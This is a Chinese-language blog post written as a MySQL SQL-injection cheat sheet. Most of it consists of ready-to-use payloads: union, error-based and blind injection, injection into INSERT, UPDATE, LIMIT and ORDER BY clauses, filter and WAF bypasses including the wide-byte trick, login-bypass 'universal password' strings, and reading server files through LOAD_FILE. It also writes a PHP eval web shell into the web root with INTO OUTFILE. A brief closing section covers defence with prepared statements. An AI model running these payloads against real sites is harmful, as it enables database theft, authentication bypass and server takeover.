---
title: MYSQLI备忘录
date: 2018-04-10 18:19:53
categories: Web
tags:
 - Web
 - sqli
description:
---
基于目前的见解整理的内容


<!-- more -->
# 什么是SQL注入?
其实就是将SQL语句插入到用户提交的可控参数中，改变原有的SQL语义结构，从而执行攻击者预期的结果。
简单的来说就是传入的参数被当作SQL语句执行。
本质上就是数据和SQL语句的混淆。

<br>
# MYSQL知识储备

## MYSQL基本信息
MYSQL默认端口是3306端口

## MYSQL常用语句

### 注释符
- `#`
- `/**/`
- `-- `

### MYSQL比较符
 - `= > < >= <=`
 - `<> !=` # 不等于
 - `LIKE '%a%'` # 默认不区分大小写
 - `IN (1, 2, 'a')`
 - `REGEXP '^a'` # 默认不区分大小写
 - `WHERE BINARY username REGEXP '^a'` # 区分大小写
 - `WHERE BINARY username LIKE '%a%'` # 区分大小写

### 当前MYSQL版本信息
 - `VERSION()`
 - `@@VERSION`
 - `@@GLOBAL.VERSION`

### 当前数据库
 - `DATABASE()`
 - `SELECT schema_name FROM information_schema.schemata`
 - `SELECT DISTINCT(db) FROM mysql.db`

### 当前操作系统版本
 - `@@version_compile_os`

### 当前用户
 - `USER()`
 - `CURRENT_USER`
 - `CURRENT_USER()`
 - `SYSTEM_USER()`      # 系统用户
 - `SESSION_USER()`      # 连接用户
 - `SELECT USER,password FROM mysql.USER`

### 读取数据库存放路径
 - `@@DATADIR`

### MYSQL安装路径
 - `@@BASEDIR`


### LENGTH()
 - `LENGTH(str)` # 统计字符长度


### 字符截取1
 - `MID(str, pos, len)`     `MID(str FROM 1 FOR 1)`
 - `SUBSTR(str, pos, len)`   `SUBSTR(str FROM pos FOR len)`
 - `SUBSTRING(str, pos, len)`    ``SUBSTRING(str FROM pos FOR len)``
 - `LEFT(str, len)`
 - `RIGHT(str, len)`
 - `LOCATE(substr, str, pos)` # 如果substr不是在str里面，返回0。

### 字符串转换为ASCII码
 - `ORD(str)`
 - `ASCII(str)`

### ASCII转换为字符串
 - `CHAR(ascii, ascii, ...)`

### 哈希函数
 - `SHA(str)`
 - `MD5(str)`

### IF语法
 - `IF(条件, True, False)`

### CASE WHEN
 - `SELECT CASE 1 WHEN 1 THEN 1 ELSE 0 END;`  # 简单写法,只能相等
 - `SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END;`  # 搜索写法,判断条件自我构建

### EXISTS
 - `SELECT * FROM USERs WHERE EXISTS(SELECT * FROM USERs)` # 能返回结果集为True，不能返回False

### SLEEP
 - `SELECT * FROM admin WHERE SLEEP(IF(MID(DATABASE(),1,1),5,0))`

### BENCHMARK
 - `BENCHMARK(count,expr)` # count == 1000000 ，expr = SHA(1)

### MYSQL读取本地文件
 - `SELECT LOAD_FILE('*.txt')`

### 写入文件
 - `SELECT 1,2,3 INTO OUTFILE '*.txt'`
 - `SELECT 1,2,3 INTO DUMPFILE 'x.txt'` #一次只能一行

### 连接字符串函数
 - `CONCAT(str1, str2)`
 - `CONCAT_WS(separator, str1, str2)`
 - `GROUP_CONCAT([DISTINCT] 字段名 [SEPARATOR str_val])`

 [更详细看这](http://www.cnblogs.com/appleat/archive/2012/09/03/2669033.html)

### 查询MySQL中所有数据库名称
 - `SELECT schema_name FROM information_schema.schemata`

### 查询MySQL中某数据库中的表名
 - `SELECT table_name FROM information_schema.tables WHERE table_schema=database()`

### 查询MYSQL中某表的列名
 - `SELECT column_name FROM information_schema.columns WHERE table_name='表名'`

### MYSQL Console 常用命令
 - `show databases;` # 展示所有数据库
 - `use database_name;` # 使用某个数据库
 - `show tables;` # 展示当前数据库的所有表
 - `desc table_name;` # 查看某个表的结构

### 特殊函数/*!comment */
 - `SELECT /*! 1,2,3 */` # version 高于 3.23.02

### 基本操作
 - `INSERT INTO USERs(username,password) VALUES('1', '2')`
 - `UPDATE 表名称 SET 列名称 = 新值 WHERE 列名称 = 某值`

### SELECT语法
```sql
SELECT 
    [ALL | DISTINCT | DISTINCTROW ] 
      [HIGH_PRIORITY] 
      [STRAIGHT_JOIN] 
      [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT] 
      [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS] 
    select_expr [, select_expr ...] 
    [FROM table_references 
    [WHERE where_condition] 
    [GROUP BY {col_name | expr | position} 
      [ASC | DESC], ... [WITH ROLLUP]] 
    [HAVING where_condition] 
    [ORDER BY {col_name | expr | position} 
      [ASC | DESC], ...] 
    [LIMIT {[offset,] row_count | row_count OFFSET offset}] 
    [PROCEDURE procedure_name(argument_list)] 
    [INTO OUTFILE 'file_name' export_options 
      | INTO DUMPFILE 'file_name' 
      | INTO var_name [, var_name]] 
    [FOR UPDATE | LOCK IN SHARE MODE]]
```

## MYSQL中单双反引号
 - **单引号**
 在标准SQL中，字符串使用的是单引号
 - **双引号**
 MYSQL中对SQL的扩展，允许双引号。
 - **反引号**
 为了区分MySQL的保留字与普通字符而引入的符号
 例如`create table use`会报错，因为use是保留字

## MYSQL运算优先级
![youxianji](youxianji.png)
数字越大优先级越高，我只记住了`*/ > -+ > = > AND > OR` 再是 `从左到右`

## MYSQL短路逻辑运算
 - **or短路运算**
 例如`SELECT 1=1 or 1=0`中,`1=1`先被运算，返回true，那么后面的`1=0`就不会被运算，只要前者返回true，那么后者就不需要运算
 - **AND短路运算**
 例如`SELECT 1=0 AND 1=1`中，`1=0`先被运算，返回false，那么后面的`1=1`就不会被运算，只要前者返回false，那么后者就不需要运算

## MYSQL版本特性
 - MySQL 4.1+ 才能子查询
 - MYSQL 5.0+ 拥有information_schema数据库，提供了视图、存储过程等功能
 - MYSQL 5.0+ union SELECT 1,2,3 后面可以不需要跟表名
 - MYSQL 5.1+ UDF导入`xx\lib\plugin\`目录下
 - MYSQL 5.X+ system执行命令


## MYSQL隐式转换

### 概述
[官方文档](https://dev.mysql.com/doc/refman/5.7/en/type-conversion.html)
- 两个参数至少有一个是 NULL 时，比较的结果也是 NULL，例外是使用 <=> 对两个 NULL 做比较时会返回 1，这两种情况都不需要做类型转换
- 两个参数都是字符串，会按照字符串来比较，不做类型转换
- 两个参数都是整数，按照整数来比较，不做类型转换
- 十六进制的值和非数字做比较时，会被当做二进制串
- 有一个参数是 TIMESTAMP 或 DATETIME，并且另外一个参数是常量，常量会被转换为 timestamp
- 有一个参数是 decimal 类型，如果另外一个参数是 decimal 或者整数，会将整数转换为 decimal 后进行比较，如果另外一个参数是浮点数，则会把 decimal 转换为浮点数进行比较
- 所有其他情况下，两个参数都会被转换为浮点数再进行比较

### 实例

#### 例1
```sql
SELECT 1 + '1'  # 2
SELECT 1 + 'a'  # 1
SELECT CONCAT(1, 'byxs') # 1byxs
```

#### 例2
![convert](convert.png)
username为字符类型，字符和数字进行比较，默认都转换为`double`在进行比较
但是又因为字符串不是数字型，所以被转换为0

```sql
`admin` = 0
0 = 0
true
```

更多可以看[MySQL隐式转化整理](http://www.cnblogs.com/rollenholt/p/5442825.html)

## PHP与MYSQL总结
mysql一般请求mysql_query不支持多语句执行，mysqli可以。


<br>
<br>
# GET POST COOKIE
在发送请求的时候，需要注意一些符号的URL编码规则

## GET
 - 一些符号需要`手动`的URL编码(`&`)
 - 注释符使用
   - `#`(手动URL编码)
   - `--%20`
   - `--+`
   - `-- a`


## POST
 - HackBar 或者BP改包在发送POST请求数据包可以不需要URL编码(除了`&`)
   - 如果手动URL编码了也没有问题
 - 注释符使用
   - `#`
   - `--空格`
   - `-- a`


## COOKIE
 - 跟POST请求相同


<br>
<br>
<br>
# 寻找注入点


<br>
<br>
<br>
# MYSQL确认注入点

<br>
<br>
<br>
# 利用SQL注入

## MYSQL联合注入

### 确定字段数
利用ORDER BY来判断目前语句中的字段数，方便后期的联合
```
id=1 ORDER BY 5 #  报错，说明小于5列
id=1 ORDER BY 3 #  正常，说明可能是3列，也可能是4列
id=1 ORDER BY 4 #  正常，说明是4列
```

### 联合查询
UNION可以将两个表的内容联合到一起，那么关于后面联合的内容，就完全由我们自己去制定
UNION中几个重要的条件
 - Union必须由两条或者两条以上的SELECT语句组成，语句之间使用Union链接
 - Union中的每个查询必须包含相同的列、表达式或者聚合函数，他们出现的顺序可以不一致（这里指查询字段相同，表不一定一样）
 - 列的数据类型必须兼容，兼容的含义是必须是数据库可以隐含的转换他们的类型


**实例**
```
id=0 UNION SELECT 1,2,3,4 # 回显1,2,3,4中的内容
id=0 UNION SELECT 1,2,VERSION(),DATABASE() # 获得版本号和当前数据库名
id=0 UNION SELECT 1,2,3,GROUP_CONCAT(schema_name) FROM information_schema.schemata # 获得所有数据库名
id=0 UNION SELECT 1,2,3,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='库名' # 获得某数据库表名
id=0 UNION SELECT 1,2,3,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='表名' # 获得某表列名
id=0 UNION SELECT 1,2,3,GROUP_CONCAT(列名) FROM 表名 # 获得数据
```


<br>
## MYSQL报错注入
当WEB应用能返回SQL的报错信息时，我们可以把想要的数据通过报错信息带出。

10种MYSQL报错注入的方式(注意：报错注入利用的方式跟 **MYSQL版本**有很大关联)
 - `SELECT * FROM users WHERE id=1 AND (SELECT 1 FROM (SELECT count(*),concat(USER(),FLOOR(RAND(0)*2))x FROM information_schema.tables group by x)a)`
 - `SELECT * FROM users WHERE id=1 AND (EXTRACTVALUE(1,concat(0x7e,(SELECT USER()),0x7e)))`
   - VERSION() > MYSQL 5.1.5
 - `SELECT * FROM users WHERE id=1 AND (UPDATEXML(1,concat(0x7e,(SELECT USER()),0x7e),1))`
   - 报错结果有32位的长度限制
   - VERSION() > MYSQL 5.1.5
 - `SELECT * FROM users WHERE id=1 AND GEOMETRYCOLLECTION((SELECT * FROM(SELECT * FROM(SELECT USER())a)b))`
 - `SELECT * FROM users WHERE id=1 AND MULTIPOINT((SELECT * FROM(SELECT * FROM(SELECT USER())a)b))`
 - `SELECT * FROM users WHERE id=1 AND POLYGON((SELECT * FROM(SELECT * FROM(SELECT USER())a)b))`
 - `SELECT * FROM users WHERE id=1 AND MULTIPOLYGON((SELECT * FROM(SELECT * FROM(SELECT USER())a)b))`
 - `SELECT * FROM users WHERE id=1 AND LINESTRING((SELECT * FROM(SELECT * FROM(SELECT USER())a)b))`
 - `SELECT * FROM users WHERE id=1 AND MULTILINESTRING((SELECT * FROM(SELECT * FROM(SELECT USER())a)b))`
 - `SELECT * FROM users WHERE id=1 AND EXP(~(SELECT * FROM(SELECT USER())a))`


[mysql十一种报错注入方式](https://www.msfcode.com/2016/10/11/%E3%80%90sql%E6%B3%A8%E5%85%A5%E3%80%91mysql%E5%8D%81%E7%A7%8D%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F/)
[Mysql报错注入笔记](https://zhuanlan.zhihu.com/p/26316761)
[MySQL Error Based SQL Injection （报错注入）总结](http://uknowsec.cn/posts/notes/MySQL%20Error%20Based%20SQL%20Injection%20%EF%BC%88%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%89%E6%80%BB%E7%BB%93.html)

<br>
## MYSQL盲注
当不能通过直接显示的途径来获取数据库数据时，需要利用其他的方式判断或者尝试，这个过程就是盲注。

一般来说可以根据以下两种来作为判断条件进行盲注
 - 基于布尔
 根据页面`回显的内容`来判断注入的语句是否成立。
 - 基于时间
 根据页面`响应的时间`来判断注入的语句是否成立。


### 基于布尔盲注
根据页面`回显的内容`来判断注入的语句是否成立。

`id = 1' AND ASCII(SUBSTRING(DATABASE(), 1, 1)) > 32`


### 基于时间盲注
根据页面`响应的时间`来判断注入的语句是否成立。

`id = 1' AND IF(SUBSTRING(DATABASE(), 1, 1) = 'a', SLEEP(5), 1)`
`id = 1' AND IF(SUBSTRING(DATABASE(), 1, 1) = 'a', BENCHMARK(100000,SHA1(1)), 1)`

<br>
## INSERT INTO注入
 - 报错注入(利用MYSQL报错信息带出数据)
   - `INSERT INTO users VALUES('1','2' AND UPDATEXML(1,CONCAT(1,DATABASE(),0x7e),1) AND '1')`
   - 连接符可以使用`and or xor && || + - * / | &`
 - 插入多条数据内容
   - `INSERT INTO users VALUES(NULL,'1','2'),(NULL,database(),'3')`
 - 盲注
   - 布尔盲注
     - 这边个人认为布尔盲注是没有问题的，但是如果存在多用户操作，那么盲注的过程会出现问题，不如使用时间盲注
   - 时间盲注
     - `INSERT INTO users VALUES(NULL,'username' or SLEEP(2),'password');`



<br>
## UPDATE 注入
 - 报错注入
   - `UPDATE users SET username = '' AND UPDATEXML(1,CONCAT(1,DATABASE(),0x7e),1) WHERE password = '2'`
   - 注意：update中子查询不能跟相同的表名
     - `UPDATE users SET username = '' AND UPDATEXML(1,CONCAT(1,(SELECT id FROM (SELECT * FROM users)x),0x7e),1) WHERE password = '2'`
 - 盲注(同INSERT)

## DELETE INTO 注入
 - 报错注入
 - 盲注(同INSERT)


另外的一种姿势   [一种新的MySQL下Update、Insert注入方法](https://www.anquanke.com/post/id/85487)

<br>
## LIMIT 注入

### 无ORDER BY
可以使用`UNION SELECT`来进行联合注入
```SQL
SELECT * FROM users LIMIT 1,1 UNION SELECT 1,2,3#,1
SELECT * FROM users ORDER BY 3LIMIT 1,1 UNION SELECT 1,2,3 #,1     
# 如果有orderby会报错incorrect usage of UNION and ORDER BY
```

### 有ORDER BY
```sql
// 利用报错
SELECT * FROM users ORDER BY 3  LIMIT 1,1 procedure analyse(updatexml(1,concat(0x7e,version(),0x7e),1),1) #,1

// 利用时间盲注
SELECT field FROM table WHERE id > 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)

时间盲注在实验的时候出现报错，报错信息是语法错误，该问题待解决
```






<br>
## ORDER BY 注入

### 判断ORDER BY 注入点
```
// 根据IF条件语句判断执行的排序结果
orderby=IF(3>2,username,password)
orderby=IF(2>2,username,password)

注意：只能使用username这样的字段名，不能使用 IF(3>2,1,100)
因为返回内容会判断为字符返回，而不是整数类型
```

### ORDER BY 盲注
#### 已知字段名
```
利用排序顺序盲注

// IF
IF((SELECT ASCII(SUBSTR(DATABASE(), 1, 1)))>100, username, password)

// CASE WHEN
CASE WHEN ((SELECT ASCII(SUBSTR(DATABASE(), 1, 1)))>100) THEN username ELSE password END
```


#### 未知字段名
在未知字段名的情况下

##### 利用MYSQL报错
此报错与报错注入的报错不一样，只是在FALSE的时候让语句执行产生错误
```
如果条件不满足，触发FALSE，SQL语句会产生错误
数据库报错信息为： Subquery returns more than 1 row

// IF
IF((SELECT ASCII(SUBSTR(DATABASE(), 1, 1)))>100, 1, (SELECT 1 FROM information_schema))

// CASE WHEN
CASE WHEN ((SELECT ASCII(SUBSTR(DATABASE(), 1, 1)))>100) THEN 1 ELSE (SELECT 1 FROM information_schema) END


// 可以造成同样的错误
IF((SELECT ASCII(SUBSTR(DATABASE(), 1, 1)))>100, 1, (SELECT 1 UNION SELECT 2))
```

##### 利用时间盲注
```
// IF
IF((SELECT ASCII(SUBSTR(DATABASE(), 1, 1)))=100, SLEEP(5), 1)

// CASE WHEN
CASE WHEN ((SELECT ASCII(SUBSTR(DATABASE(), 1, 1)))>100) THEN SLEEP(5) ELSE 1 END
```

##### 基于RAND()盲注
```
RAND(TRUE) // 0.15522042769493574200000
RAND(FALSE) // 0.40540353712197724200000

// TRUE/FALSE 所返回的内容不同，可以根据排序顺序来判断
SELECT * FROM users ORDER BY RAND(TRUE/FALSE)

// Payload
RAND( (SELECT ASCII(SUBSTR(DATABASE(), 1, 1)))>100 )
```

#### ORDER BY 报错注入
如果页面将MYSQL报错信息打印出，可以利用报错注入来获取数据内容
```
// 报错注入语句即可
UPDATEXML(1,CONCAT(1,DATABASE(),1),1)
```


ORDER BY 注入参照文章:
[MySQL Order By 注入总结](https://www.secpulse.com/archives/57197.html)

#### ORDER BY 一种使用姿势
结合两位大牛可以这样描述**基于UNION查询的ORDER BY 盲注**
在不知道某字段列名的情况下，可以利用union与order by来进行盲注

假设以下查询中我们不知道第一个字段名，我们可以利用union插入数据，并利用order by来对不知道字段名的列进行排序
![injection13](injection13.png)

 - 当host字段回显为2，说明排序在上方，也就是比实际数据要小或等于
 - 当host字段回显为正常数据，说明排序在下面，也就是比实际数据要大

我们便可以通过这样的比对来获取真正的数据
同时我们也能观察它们是根据`ASCII`码来进行排序的
但是这边会出现一个问题，`SELECT 'Bc' UNION SELECT 'b' ORDER BY 1`，`b`和`B`的ASCII码分别为`98`和`66`，但是实际的排序结果如下
```
+----+
| Bc |
+----+
| b  |
| Bc |
```
实际上MYSQL在默认的情况下查询是不区分大小写的,解决办法通常有以下两种
 - 数据库设计的时候，可能需要大小写敏感，解决方法是建表时候使用BINARY标示。
 - 使用BINARY关键字


**wonderkun师傅也提到利用binary来区别大小写**
```
select  'ab'  union select binary 'Ab' order by 1 ;

+----+
| ab |
+----+
| Ab |
| ab |
+----+
```

更具体的实验请看两位师傅的文章，很详细
[利用order by 进行盲注](http://p0sec.net/index.php/archives/106/)
[基于union查询的盲注(感谢pcat牛不吝赐教)](http://wonderkun.cc/index.html/?p=547)









<br>
## 文件操作写入与读取

### 使用前提
 - secure_file_priv权限
   - 用来限制数据导入和导出操作的全局系统变量
   - 参数为空，这个变量没有效果；
   - 参数设为一个目录名，MySQL服务只允许在这个目录中执行文件的导入和导出操作。这个目录必须存在，MySQL服务不会创建它；
   - 参数为NULL，MySQL服务会禁止导入和导出操作。
   - MYSQL的5.5.53之前的版本是默认为空,之后的版本为NULL
   - 运行该命令可以查看`show global variables like '%secure%';`。
 - 知道可写的WEB路径
 - 对WEB目录有读写权限


### 利用LOAD_FILE()读取文件
一般用它来看config.php（即mysql的密码）,apache配置、servu密码等。前提是要知道物理路径。
 - 可以在UNION中作为一个字段来用。
 `UNION SELECT 1,LOAD_FILE('c:/boot.ini'),3,4`
 - 可以在where字句中使用。
 `AND LENGTH(LOAD_FILE(0x633A2F626F6F742E696E69))>1`
 - 看exe等含有二进制的00等截断或者回车换行等特殊符号时，可以结合hex函数。


#### 注意点
 - 路径可以是单引号、0x、char转换的字符。路径中的斜杠是`/`而不是`\`。
 - 默认目录@@datadir
 - 文件有可读权限,读文件最大的为1047552个byte, @@max_allowed_packet可以查看文件读取最大值


### 利用INTO OUTFILE/INTO DUMPFILE写入文件
在一些前提下，可以利用它在服务器写入一句话或者二进制文件。
 - 一句话（经典）
 `SELECT '<?php eval($_POST[cmd])?>' INTO OUTFILE 'D:/shell.php'`
 `SELECT * FROM users INTO OUTFILE 'D:/shell.php'`
  - OUTFILE 和 DUMPFILE 区别和特点
 INTO OUTFILE函数写文件时会在每一行的结束自动加上换行符
 INTO DUMPFILE函数在写文件会保持文件得到原生内容，这种方式对于二进制文件是最好的选择
 当我们在UDF提权的场景是需要上传二进制文件等等用OUTFILE函数是不能成功的


#### 注意点
 - 只能是单引号路径,不能接0x开头或者char转换以后的路径。
 这个问题在php注入中更加麻烦，因为会自动将单引号转义成\',那么基本没的玩了。
 唯一的一种可能就是你使用mysql远程连接，然后直接在mysql中执行命令，就没有查询限制了。当然，你要是找到了phpmyadmin，也可以。
 - INTO OUTFILE/INTO DUMPFILE 不会覆盖文件。(文件已存在会报错)





<br>

## 带外通道注入
带外通道攻击主要是利用其他协议或者渠道从服务器提取数据. 它可能是HTTP（S）请求，DNS解析服务，SMB服务，Mail服务等.


<br>
## HTTP参数污染
待补充

<br><br><br>
# 绕过姿势

## 大小写绕过
`?id=1 Union Select 1,2 #`

## 替换绕过
`?id=1 Ununionion Seselectlect 1,2 #`

## 注释绕过
`?id=1 Uni/**/on Sele/**/ct 1,2 #`

## 特殊嵌入绕过
`?id=1/*!Union*/Select 1,2 #`

## 空字节绕过
`%00' UNION SELECT 1`
某些过滤器在做处理时，遇见空字节会停止进行处理（%00 == 空字节）


## 宽字节绕过

### 原理
以ANSI为编码标准一个汉字占2字节，例如GBK，GB2312（UTF-8 3字节）
当站点的MYSQL使用GBK编码，并且使用`addslashes`来防止SQL注入
当传入参数是`1%df' AND 1=1 %23`时,`'`会被`addslashes`转移为`\'`,而`\`的GBK编码为%5c，`%df%5c`又会被认为是一个汉字，那么最后`'`会被保留。


### 条件
针对于使用以下数据库编码格式和过滤方式的站点
 - `GBK` + `addslashes` or `mysql_real_escape_string`
 - 注意：如果没有指定php连接mysql的字符集，mysql_real_escape_string 是抵御无效的。

### 利用方式
在单引号前面加`%df`,例如`1%df' AND 1=1 %23`
GBK中ASCII码中大于128为汉字所以使用%a1以上的都行，只要组合被认为是汉字。


## 字符编码绕过
编码设置引发的安全问题,待补充
[Mysql字符编码利用技巧](https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html)


<br>

# 绕过思路

## OR或AND绕过
 - 大小写变形
   - `Or,OR,oR`
 - 双写绕过
   - `oorr anandd`
 - 添加注释
   - `/*or*/`
 - 使用 `||`  `&&` 代替。（注意对`&&`进行URL编码）


## 空格绕过
 - 使用 `/**/`绕过过滤空格。
   - `id=1'/**/AND/**/1=1#`
 - 不使用空格绕过
   - `id=(sleep(ascii(mid(user()from(2)for(1)))=109))`
   - `1'||updatexml(1,concat(0x7e,version()),1)||'1'='1`
 - 特殊字符代替
   - `%09` TAB键（水平）
   - `%0a` 新建一行
   - `%0c` 新的一页
   - `%0d` return功能
   - `%0b` TAB键（垂直）
   - `%a0` 空格

## 单引号绕过
 - 宽字节绕过
   - `id=%df' AND 1=1 #`
 - 将字符串转换为16进制
   - `SELECT * FROM users WHERE username = 0x61646d696e`
 - 使用CHAR()
   - `SELECT * FROM users WHERE username = CHAR(97, 100, 109, 105, 110)`

## 逗号绕过
 - 不是用逗号
   - `SUBSTR(str FROM pos FOR len)`
   - `SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END`
   - `LIMIT 1 OFFSET 1`

## 注释符绕过
 - 闭合绕过



<br>
<br>
# 有趣的姿势

## MYSQL万能密码
可以利用MYSQL隐式转换

 - `SELECT * FROM users WHERE username = '' = ''`
 - `SELECT * FROM users WHERE username = '' - ''`
 - `SELECT * FROM users WHERE username = '' * ''`
 - `SELECT * FROM users WHERE username = '' = ''`
 - `SELECT * FROM users WHERE username = '' / 1`
 - `SELECT * FROM users WHERE username = '' % ''`

<br>
## MYSQL约束攻击
[实例](https://ch1st.github.io/2017/10/19/Mysql%E7%BA%A6%E6%9D%9F%E6%94%BB%E5%87%BB/)


<br>
## GROUP BY WITH ROLLUP
可以利用它来构建一个空密码
![GROUPBYWITHROLLUP](gROUPBYWITHROLLUP.png)

利用它还需要注意两点
1. 必须有数据，才能构建。所以利用`username=''=''`永真条件来得到所有用户数据
2. 利用limit来读取估计第二个条目。


<br>
## 绕过未知字段名的技巧
[具体参照这](http://rcoil.me/2017/05/MySQL%E5%81%8F%E9%97%A8%E6%8A%80%E5%B7%A7/)



<br><br>

# 防御
## 过滤函数
 - `addslashes()`
 - `mysql_real_escape_string()`
 - `mysql_escape_string()`

## mysqli
```php
$mysqli = new mysqli("localhost", "root", "123123", "security");
$stmt = $mysqli->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param('d', $_GET['id']);
$stmt->execute();
$res = $stmt->get_result();
$row = $res->fetch_assoc();
var_dump($row);
```

## pdo
```php
$pdo = new PDO("mysql:host=localhost;dbname=security;",'root','123123');
// $pdo->setAttribute(PDO::ATTR_EMULATE_PREPARES,false);
$pdo->exec('set names utf8');
$sql = "select * from users where id = ?";
$statement = $pdo->prepare($sql);
$statement->bindParam(1, $_GET['id']);
$statement->execute();
$ret = $statement->fetchAll();
var_dump($ret);
```




<br><br>
# 疑问以及解决

## SLEEP()碰见的小坑
 - `SELECT * FROM users WHERE id=1 OR SLEEP(1)`
 会执行`count(*) * 1`的秒数
 - `SELECT * FROM users WHERE id=1 AND SLEEP(1)`
 如果ID=1存在，那么只会睡眠一秒

### 结论
 - 使用AND需要保证数据存在
 - 使用OR会等待更多的时间,如果数据不止一条


## --注释符无法使用
 - `--`后面要有空格，注释无效的情况可能是结尾有空格但发送数据包是没有被包括，解决办法
  - `--%20`     # 空格手动URL编码
  - `--+`       # +号代替空格
  - `-- a`      # --空格后面带字符串，浏览器做URL编码




<br>
